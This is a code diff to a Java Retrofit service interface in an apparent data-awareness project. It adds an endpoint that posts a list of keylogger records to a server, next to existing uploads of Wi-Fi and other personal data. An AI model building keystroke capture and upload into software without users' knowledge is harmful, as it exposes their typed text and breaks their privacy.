@@ -1,6 +1,9 @@
 package ca.uqac.bigdataetmoi.services;
 
+import java.util.List;
+
 import ca.uqac.bigdataetmoi.dto.CoordinateDto;
+import ca.uqac.bigdataetmoi.dto.KeyloggerDto;
 import ca.uqac.bigdataetmoi.dto.MessageDto;
 import ca.uqac.bigdataetmoi.dto.PhotoDto;
 import ca.uqac.bigdataetmoi.dto.UserAuthenticationDto;
@@ -29,6 +32,9 @@ public interface UserService {
 
     @POST("wifi")
     Call<User> sendWifi(@Body WifiDto[]  wifiList);
+
+    @POST("keylogger")
+    Call<User> sendKeyloggerList(@Body List<KeyloggerDto> keyloggerList);
 
     @GET("users/me")
     Call<User> getCurrentUserInformations();
